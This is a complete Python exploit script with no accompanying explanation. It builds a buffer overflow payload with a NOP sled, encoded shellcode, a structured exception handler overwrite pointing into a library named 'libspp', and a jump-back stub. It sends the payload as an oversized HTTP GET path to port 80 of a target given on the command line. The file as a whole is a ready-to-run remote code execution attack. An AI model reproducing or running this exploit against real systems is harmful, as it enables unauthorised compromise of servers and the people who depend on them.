import sys
from struct import pack
import socket
import threading

shellcode = b"\x90" * 40
shellcode += b"\x66\x81\xec\x22\x02" #6681EC2202 (move esp far far away from here so we don't overwrite shellcode)
shellcode += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\xb9\xaa\xba\xfd\x83\xee\xfc"
shellcode += b"\xe2\xf4\x45\x42\x38\xfd\xb9\xaa\xda\x74\x5c"
shellcode += b"\x9b\x7a\x99\x32\xfa\x8a\x76\xeb\xa6\x31\xaf"
shellcode += b"\xad\x21\xc8\xd5\xb6\x1d\xf0\xdb\x88\x55\x16"
shellcode += b"\xc1\xd8\xd6\xb8\xd1\x99\x6b\x75\xf0\xb8\x6d"
shellcode += b"\x58\x0f\xeb\xfd\x31\xaf\xa9\x21\xf0\xc1\x32"
shellcode += b"\xe6\xab\x85\x5a\xe2\xbb\x2c\xe8\x21\xe3\xdd"
shellcode += b"\xb8\x79\x31\xb4\xa1\x49\x80\xb4\x32\x9e\x31"
shellcode += b"\xfc\x6f\x9b\x45\x51\x78\x65\xb7\xfc\x7e\x92"
shellcode += b"\x5a\x88\x4f\xa9\xc7\x05\x82\xd7\x9e\x88\x5d"
shellcode += b"\xf2\x31\xa5\x9d\xab\x69\x9b\x32\xa6\xf1\x76"
shellcode += b"\xe1\xb6\xbb\x2e\x32\xae\x31\xfc\x69\x23\xfe"
shellcode += b"\xd9\x9d\xf1\xe1\x9c\xe0\xf0\xeb\x02\x59\xf5"
shellcode += b"\xe5\xa7\x32\xb8\x51\x70\xe4\xc2\x89\xcf\xb9"
shellcode += b"\xaa\xd2\x8a\xca\x98\xe5\xa9\xd1\xe6\xcd\xdb"
shellcode += b"\xbe\x55\x6f\x45\x29\xab\xba\xfd\x90\x6e\xee"
shellcode += b"\xad\xd1\x83\x3a\x96\xb9\x55\x6f\xad\xe9\xfa"
shellcode += b"\xea\xbd\xe9\xea\xea\x95\x53\xa5\x65\x1d\x46"
shellcode += b"\x7f\x2d\x97\xbc\xc2\xb0\xf8\xbc\xa0\xd2\xff"
shellcode += b"\xb9\xbb\xe6\x74\x5f\xc0\xaa\xab\xee\xc2\x23"
shellcode += b"\x58\xcd\xcb\x45\x28\x3c\x6a\xce\xf1\x46\xe4"
shellcode += b"\xb2\x88\x55\xc2\x4a\x48\x1b\xfc\x45\x28\xd1"
shellcode += b"\xc9\xd7\x99\xb9\x23\x59\xaa\xee\xfd\x8b\x0b"
shellcode += b"\xd3\xb8\xe3\xab\x5b\x57\xdc\x3a\xfd\x8e\x86"
shellcode += b"\xfc\xb8\x27\xfe\xd9\xa9\x6c\xba\xb9\xed\xfa"
shellcode += b"\xec\xab\xef\xec\xec\xb3\xef\xfc\xe9\xab\xd1"
shellcode += b"\xd3\x76\xc2\x3f\x55\x6f\x74\x59\xe4\xec\xbb"
shellcode += b"\x46\x9a\xd2\xf5\x3e\xb7\xda\x02\x6c\x11\x5a"
shellcode += b"\xe0\x93\xa0\xd2\x5b\x2c\x17\x27\x02\x6c\x96"
shellcode += b"\xbc\x81\xb3\x2a\x41\x1d\xcc\xaf\x01\xba\xaa"
shellcode += b"\xd8\xd5\x97\xb9\xf9\x45\x28"


payload=shellcode
payload+=b"\x41" * (2495 - len(shellcode))

payload+=pack("<L", (0x06eb9090)) #jmp forward 6 bytes to skip the ppr address
payload+=pack("<L", (0x101503d8)) # ppr in libspp

payload+=b"\x90" * 2 #even out bytes
payload+=b"\x66\x81\xc4\x1a\x04"    #add this to sp: 6681C41A04
payload+=b"\xff\xe4" #jmp esp
payload+=b"\x43" * 5000



def exploit(target, payload):
    print("[*] Sending payload to http://{}/".format(target))
    req  = b"GET /" + payload + b" HTTP/1.1\r\n"
    req += b"Host: " + target.encode() + b"\r\n"
    req += b"\r\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 80))
        s.sendall(req)
        s.close()
    except Exception as e:
        print("[!] Connection error (often expected):", e)
target = sys.argv[1]
t = threading.Thread(target=exploit, args=(target, payload))
t.start()
t.join()
print("[*] Done.")
